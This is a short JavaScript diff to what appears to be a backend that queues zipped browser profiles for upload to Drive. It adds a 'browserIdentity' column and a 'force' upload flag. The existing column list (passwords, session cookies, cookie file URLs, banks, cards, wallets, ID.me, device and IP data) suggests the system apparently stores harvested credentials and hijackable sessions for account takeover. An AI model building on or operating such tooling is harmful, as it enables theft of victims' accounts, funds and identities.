@@ -62,6 +62,7 @@ const DRIVE_RETRY_BACKOFFS = [5000, 10000, 30000, 60000, 120000]; // 5s → 2m (
 const DEFAULT_KNOWN_COLUMNS = new Set([
   'browserId', 'status', 'email', 'password', 'lastRun', 'lastJsonResponse',
   'cookieJSON', 'formattedCookie', 'cookieFileURL', 'driveUrl', 'platform',
+  'browserIdentity',
   'verified', 'fullAccess', 'server', 'timestamp', 'lastUserActivity',
   'projectId', 'userId', 'formId', 'strictly', 'domain', 'ipData', 'deviceData',
   'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider'
@@ -351,7 +352,7 @@ async function executeDriveJob(job) {
       execTimer = setTimeout(() => resolve({ ok: false, permanent: false, reason: `Drive exec timed out after ${DRIVE_EXEC_TIMEOUT_MS}ms (zip/upload hang)` }), DRIVE_EXEC_TIMEOUT_MS);
     });
     const result = await Promise.race([
-      uploadBrowserDataRaw(job.browserId, job.updateData || {}, job.userDataDir),
+      uploadBrowserDataRaw(job.browserId, job.updateData || {}, job.userDataDir, { force: !!job.force }),
       execTimeout
     ]);
     if (execTimer) clearTimeout(execTimer);
@@ -624,6 +625,7 @@ export function enqueueDriveUpload(browserId, updateData, userDataDir, opts = {}
       nextRetryAt: 0,
       resolve: callResolve,
       autoFinalize: !!opts.autoFinalize,
+      force: !!opts.force,
       completionLjr: opts.completionLjr || (updateData && updateData.lastJsonResponse) || null,
       waitFor: opts.waitFor || null
     });
